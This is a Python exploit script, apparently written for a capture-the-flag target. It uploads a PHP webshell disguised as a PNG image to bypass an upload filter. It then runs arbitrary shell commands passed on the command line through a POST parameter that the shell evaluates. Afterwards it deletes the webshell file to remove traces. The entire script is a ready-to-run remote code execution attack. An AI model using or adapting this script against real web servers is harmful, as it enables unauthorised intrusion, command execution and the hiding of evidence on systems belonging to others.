#!/usr/bin/python
import requests
import sys

url = "http://h4ck3r.quest:9011/"
file_path = "./config.png.php"
filename = "config.png.php"
file_data = {'image_file':(filename, open(file_path, 'rb'), 'image/png')}
upload_path = ""
cmd = ""

try:
    cmd = sys.argv[1]
except:
    print("Usage : ./exploit.py id")
    exit()

print("Uploading webshell...")
r = requests.post(url, files=file_data)

data = r.text.strip().split('\n')
for i in data:
    if "<img src" in i:
        upload_path = i.strip().split('"')[1]

if "php" in upload_path: print("Upload Success!")
else:
    print("Upload Failed.")
    exit()
exploit_url = url + upload_path[1:len(upload_path)]

def rce_request(url, cmd):
    payload = {"val": f"die(`{cmd}`);"}
    r = requests.post(url, data=payload)
    return r.text

print("-----------------------------------")
print("Exploit URL : " + exploit_url)
print("Execute Command : " + cmd)
print("-----------------------------------")
print(rce_request(exploit_url, cmd))
print("-----------------------------------")

# Clearn Webshell
print("Clearn up webshell...")
clearn_path = rce_request(exploit_url, "pwd").strip() + "/" + upload_path.split('/')[2]
rce_request(exploit_url, f"rm {clearn_path}")

r = requests.get(exploit_url)
if r.status_code == 404: print("Clearn Success.")
else: print("Clearn Failed.")
